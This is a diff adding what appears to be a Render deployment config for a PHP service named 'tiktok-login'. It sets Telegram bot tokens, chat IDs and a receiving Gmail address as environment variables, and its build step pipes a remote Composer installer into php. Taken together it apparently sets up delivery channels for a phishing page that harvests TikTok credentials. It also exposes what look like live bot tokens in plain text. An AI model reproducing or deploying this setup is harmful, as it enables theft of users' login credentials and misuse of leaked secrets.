@@ -1,0 +1,25 @@
+services:
+  - type: web
+    name: tiktok-login
+    runtime: php
+    plan: free
+    buildCommand: |
+      curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
+      composer install --no-dev --optimize-autoloader
+    startCommand: "php -S 0.0.0.0:$PORT -t . index.php"
+    envVars:
+      - key: TELEGRAM_BOT_TOKEN_1
+        value: "8540752369:AAGcN62DlKUeh-cN9sR2LiBiunt_-RJSxJY"
+        type: secret
+      - key: TELEGRAM_CHAT_ID_1
+        value: "6037378895"
+        type: secret
+      - key: TELEGRAM_BOT_TOKEN_2
+        value: "8272404690:AAFjvKof7tWOT2ITQTWXWxJyr32dYW8QWi4"
+        type: secret
+      - key: TELEGRAM_CHAT_ID_2
+        value: "ADD_YOUR_CHAT_ID_HERE"
+        type: secret
+      - key: RECEIVE_EMAIL
+        value: "davidmassmutual@gmail.com"
+        type: secret
